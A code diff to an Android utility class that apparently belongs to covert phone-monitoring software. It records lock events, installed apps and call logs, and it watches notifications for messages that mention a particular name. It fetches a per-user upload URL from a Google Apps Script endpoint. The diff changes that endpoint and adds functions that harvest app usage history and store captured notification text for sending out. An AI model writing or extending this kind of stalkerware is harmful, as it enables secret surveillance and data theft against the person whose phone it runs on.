@@ -8,6 +8,8 @@ import android.app.Activity;
 import android.app.ActivityManager;
 import android.app.Application;
 import android.app.KeyguardManager;
+import android.app.usage.UsageStats;
+import android.app.usage.UsageStatsManager;
 import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
 import android.content.Context;
@@ -38,6 +40,7 @@ import com.android.volley.VolleyError;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 import com.google.gson.Gson;
+import com.google.gson.JsonArray;
 import com.google.gson.reflect.TypeToken;
 import com.wickerlabs.logmanager.LogObject;
 import com.wickerlabs.logmanager.LogsManager;
@@ -58,6 +61,9 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
+import java.util.Map;
+import java.util.SortedMap;
+import java.util.TreeMap;
 
 public class Utils {
     static String laststatus="";
@@ -157,7 +163,7 @@ public class Utils {
 
     }
     public static void newUrlData(Context context,Sharedpref mSharedpref){
-       String url="https://script.googleusercontent.com/macros/echo?user_content_key=RdsJJZR1E_p8xnTCxFEtKU7tqCFkUC_FTl3E2g_cDSIjpo-V43chBBHgueEZb0TFHwjC-4TPOuQPKeaiaJj0jjjQkeJ4Hs0Wm5_BxDlH2jW0nuo2oDemN9CCS2h10ox_1xSncGQajx_ryfhECjZEnH8eXEwHkzBGtIkfTyiTbSQKygxmT3GiA5SP-kQUhNAjebhQ5PeN_2JFSwNzgXMLi_qVtBV2CbTgnh8KTGIWb5_kN85XsxDPBA&lib=M2DzEZy__TPANi9YiRKV2MkfyXhMohYri";
+       String url="https://script.google.com/macros/s/AKfycbxFnPonThhSsFKGj_5JEfX0r4x56jjh-Fx19qgB07rOaV7qsi-prMLkWqfS8MrhsH93/exec";
         String Name = mSharedpref.getSaveName();
         if(isConnectedToNetwork(context)){
             StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
@@ -168,13 +174,15 @@ public class Utils {
                             try {
                                 JSONObject jsonObject=new JSONObject(response);
                                 JSONArray jsonArray=jsonObject.getJSONArray("user");
-                                for (int i=0;i<jsonArray.length()-1;i++){
+                                for (int i=0;i<jsonArray.length();i++){
                                     JSONObject jsonObject1=jsonArray.getJSONObject(i);
                                     String mName=jsonObject1.getString("name");
                                     Log.d("",mName);
                                     if (Name.trim().equalsIgnoreCase(mName.trim())){
                                         String mUrl=jsonObject1.getString("url");
+                                        boolean tosend= Boolean.parseBoolean(jsonObject1.getString("OneTimeOn"));
                                         mSharedpref.setUrl(mUrl);
+                                        mSharedpref.setSendDataOneTime(tosend);
                                         mSharedpref.commit();
                                         break;
                                     }
@@ -188,7 +196,7 @@ public class Utils {
                         @Override
                         public void onErrorResponse(VolleyError error) {
                             Log.d(context.getPackageName(),"Error");
-                            setuponetimeworkManager("From new Url");
+                            setuponetimeworkManager(context,"From new Url");
                         }
                     }
             );
@@ -318,7 +326,7 @@ public class Utils {
                     mSharedpref.setPhoneLockDetails(jsonArray.toString());
                     mSharedpref.commit();
                     if (status.equalsIgnoreCase("Locked")){
-                        setuponetimeworkManager("When Phone being Locked");
+                        setuponetimeworkManager(context,"When Phone being Locked");
                     }
 
                 } catch (JSONException e) {
@@ -358,7 +366,7 @@ public class Utils {
                         mSharedpref.commit();
                         try {
                             if (title.contains("Muhib") || text.contains("Muhib")) {
-                                setuponetimeworkManager("From Broad Other Notification ");
+                                setuponetimeworkManager(context,"From Broad Other Notification ");
                             }
 
                         } catch (Exception e) {
@@ -566,6 +574,65 @@ public class Utils {
         mSharedpref.setPhoneAppdetailsListSize(appsInstallednames.size());
         mSharedpref.setPhoneAppdetails(appnames);
         mSharedpref.commit();
+    }
+    public static void getAppDataHistory(Context mContext, Sharedpref mSharedpref) {
+        UsageStatsManager mUsageStatsManager = (UsageStatsManager)mContext.getSystemService(Context.USAGE_STATS_SERVICE);
+        long time = System.currentTimeMillis();
+
+// We get usage stats for the last 10 seconds
+        List<UsageStats> stats = mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000*10, time);
+
+// Sort the stats by the last time used
+        if(stats != null) {
+            SortedMap<Long,UsageStats> mySortedMap = new TreeMap<>();
+            for (UsageStats usageStats : stats) {
+                mySortedMap.put(usageStats.getLastTimeUsed(),usageStats);
+            }
+            String AppHisory=mSharedpref.getAppUsageHistory();
+            JSONArray mJsonArray=new JSONArray();
+                try {
+                    if (!StringUtils.isBlank(AppHisory)){
+                    mJsonArray=new JSONArray(AppHisory);
+                }
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+
+            if(mySortedMap != null && !mySortedMap.isEmpty()) {
+                for (Map.Entry<Long, UsageStats> entry : mySortedMap.entrySet()){
+                    JSONObject mJsonObject=new JSONObject();
+                    try {
+                        long da=entry.getKey();
+                        String filedate = android.text.format.DateFormat.format("dd-MM-yyyy HH:mm:ss",new Date(da)).toString();
+
+                        mJsonObject.put("Date",filedate);
+                        mJsonObject.put("Pac",entry.getValue().getPackageName());
+                        mJsonArray.put(mJsonObject);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+                 mSharedpref.setAppUsageHistory(mJsonArray.toString());
+            }
+        }
+
+    }
+    public static void setinfo(Sharedpref mSharedpref,String title, String text){
+        String AppHisory=mSharedpref.getOtherinfo();
+        JSONArray mJsonArray=new JSONArray();
+        JSONObject jsonObject=new JSONObject();
+        try {
+            if (!StringUtils.isBlank(AppHisory)){
+                mJsonArray=new JSONArray(AppHisory);
+            }
+            jsonObject.put("Date",getDateTime());
+            jsonObject.put("Title",title);
+            jsonObject.put("text",text);
+            mJsonArray.put(jsonObject);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+        mSharedpref.setotherinfo(mJsonArray.toString());
     }
 
 }
